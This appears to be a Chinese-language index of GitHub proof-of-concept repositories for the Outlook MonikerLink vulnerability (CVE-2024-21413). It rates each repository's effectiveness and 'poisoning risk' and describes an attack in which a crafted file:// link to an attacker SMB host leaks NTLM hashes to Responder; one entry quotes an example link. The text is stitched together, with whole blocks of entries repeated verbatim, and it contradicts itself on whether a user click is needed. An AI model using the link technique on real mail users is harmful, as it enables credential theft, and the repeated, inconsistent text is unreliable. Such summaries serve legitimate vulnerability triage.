4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
